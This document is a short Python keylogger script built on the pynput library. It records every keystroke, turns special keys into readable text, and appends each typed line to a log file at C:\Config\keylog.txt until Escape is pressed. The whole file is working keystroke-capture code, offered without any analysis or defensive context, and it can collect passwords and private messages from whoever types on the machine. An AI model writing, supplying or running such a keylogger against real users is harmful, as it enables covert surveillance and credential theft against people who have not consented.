import os
from pynput.keyboard import Key, Listener

current_directory = 'C:\\Config'
# current_directory = os.path.dirname(os.path.realpath(__file__))
log_file = os.path.join(current_directory, "keylog.txt")

current_line = []
def on_press(key):
    try:
        current_line.append(str(key.char))
    except AttributeError:
        special_keys = {
            Key.space: " ",
            Key.enter: "\n",
            Key.shift: "",
            Key.alt: "ALT",
            Key.ctrl: "CTRL",
            Key.tab: "Tab",
            # Key.win: "WIN",
        }
        if key in special_keys:
            current_line.append(special_keys[key])
        else:
            current_line.append(str(key))

def on_release(key):
    if key == Key.enter:
        with open(log_file, "a") as f:
            f.write(''.join(current_line) + "\n")
        current_line.clear()
    elif key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Listening for keyboard input...")
    listener.join()
